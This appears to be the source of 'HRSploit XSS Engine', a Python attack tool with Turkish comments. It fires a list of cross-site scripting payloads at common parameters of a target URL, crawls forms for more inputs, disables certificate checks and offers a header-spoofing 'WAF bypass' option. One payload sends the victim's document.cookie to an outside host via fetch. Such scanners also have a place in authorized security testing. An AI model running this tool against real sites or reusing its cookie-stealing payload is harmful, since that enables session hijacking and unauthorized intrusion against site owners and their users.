#!/usr/bin/env python3
"""
HRSploit — XSS Engine
Gerçek XSS tarama motoru: Reflected, Stored, DOM-based.
"""
import sys, re, time, argparse, requests, urllib.parse
from datetime import datetime

requests.packages.urllib3.disable_warnings()

PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(document.cookie)>',
    "';alert(1)//",
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '"><svg/onload=confirm(1)>',
    '<iframe src=javascript:alert(1)>',
    '"><input autofocus onfocus=alert(1)>',
    '<script>fetch("//x.hr/"+document.cookie)</script>',
    '{{7*7}}', '${7*7}', '#{7*7}',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
    '<ScRiPt>alert(1)</ScRiPt>',
    'jAvAscrIpT:alert(1)',
]
PARAMS = ["q","search","s","query","input","name","title","comment",
          "msg","text","content","id","page","url","redirect","data"]

def log(tag, msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{ts} [{tag}] {msg}", flush=True)

def make_session(waf_bypass=False):
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })
    if waf_bypass:
        s.headers.update({"X-Forwarded-For":"127.0.0.1","X-Real-IP":"127.0.0.1"})
    s.verify = False
    return s

def scan(target: str, crawl: bool = False, threads: int = 5) -> list:
    log("XSS", f"Tarama başlıyor: {target}")
    log("XSS", f"{len(PAYLOADS)} payload × {len(PARAMS)} parametre")
    sess     = make_session()
    findings = []

    for pi, payload in enumerate(PAYLOADS, 1):
        log("XSS", f"Payload {pi}/{len(PAYLOADS)}: {payload[:60]}")
        for param in PARAMS:
            # GET
            try:
                r = sess.get(target, params={param: payload}, timeout=8)
                body = r.text
                reflect = payload.lower().replace('"','').replace("'",'') in body.lower()
                if reflect or ('<script' in body.lower() and 'alert' in body.lower()):
                    log("XSS-HIT", f"🔴 Reflected XSS! param={param} status={r.status_code}")
                    log("XSS-HIT", f"   Payload: {payload}")
                    log("XSS-HIT", f"   URL: {r.url}")
                    findings.append({"type":"reflected","param":param,
                                     "payload":payload,"method":"GET","url":str(r.url)})
                    time.sleep(0.1)
                    continue
            except Exception as e:
                log("XSS-WARN", f"GET error param={param}: {e}")

            # POST
            try:
                r2 = sess.post(target, data={param: payload}, timeout=8)
                body2 = r2.text
                if payload.lower().replace('"','').replace("'",'') in body2.lower():
                    log("XSS-HIT", f"🔴 Stored/Reflected XSS (POST)! param={param}")
                    findings.append({"type":"stored","param":param,
                                     "payload":payload,"method":"POST"})
            except Exception:
                pass

            time.sleep(0.05)

    if crawl:
        log("XSS", "Crawl modu: form input'ları taranıyor...")
        try:
            r_crawl = sess.get(target, timeout=10)
            forms   = re.findall(r'<form[^>]*action=["\']?([^"\'> ]+)', r_crawl.text, re.I)
            inputs  = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', r_crawl.text, re.I)
            log("XSS", f"Bulunan form: {len(forms)}  input: {len(inputs)}")
            for inp in inputs[:10]:
                for payload in PAYLOADS[:5]:
                    try:
                        r3 = sess.post(target, data={inp: payload}, timeout=8)
                        if payload.replace('"','').replace("'",'') in r3.text:
                            log("XSS-HIT", f"🔴 Form XSS: input={inp}")
                            findings.append({"type":"form","param":inp,"payload":payload})
                            break
                    except Exception:
                        pass
        except Exception as e:
            log("XSS-WARN", f"Crawl hatası: {e}")

    log("XSS", f"Tarama tamamlandı — {len(findings)} XSS bulundu")
    return findings

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HRSploit XSS Engine")
    parser.add_argument("-u","--url",   required=True, help="Hedef URL")
    parser.add_argument("--crawl",      action="store_true", help="Form crawl")
    parser.add_argument("--threads",    type=int, default=5)
    parser.add_argument("--batch",      action="store_true", help="Sessiz mod")
    args = parser.parse_args()
    results = scan(args.url, crawl=args.crawl, threads=args.threads)
    for r in results:
        print(f"  FINDING: {r}")
